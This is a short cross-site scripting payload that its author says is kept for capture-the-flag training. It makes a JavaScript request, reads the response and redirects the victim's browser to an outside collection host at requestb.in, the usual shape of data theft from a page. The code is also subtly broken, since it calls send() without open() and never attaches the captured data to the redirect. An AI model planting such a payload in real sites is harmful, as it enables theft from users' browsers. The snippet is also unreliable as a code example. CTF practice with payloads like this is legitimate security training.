/* This is a file I use for XSS on CTFs. It is only meant for training purposes */

<script> 

var request = new XMLHttpRequest();
request.onreadystatechange = function() {
  jsontext = request.responseText;
  window.location = 'https://requestb.in/1lnfniu1';
}
request.send();

</script>
